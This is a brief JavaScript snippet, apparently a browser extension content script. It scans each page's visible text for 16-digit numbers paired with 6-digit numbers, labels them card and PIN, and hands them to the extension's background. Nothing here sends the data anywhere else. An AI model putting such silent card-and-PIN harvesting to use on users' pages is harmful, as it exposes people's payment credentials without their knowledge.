(() => {
    const text = document.body.innerText;
    const regex = /\b(\d{16})\D+?(\d{6})\b/g;
  
    let match;
    const results = [];
  
    while ((match = regex.exec(text)) !== null) {
      const card = match[1];
      const pin = match[2];
      results.push({ card, pin });
    }
  
    chrome.runtime.sendMessage({ type: 'CODES_FOUND', data: results });

    
  })();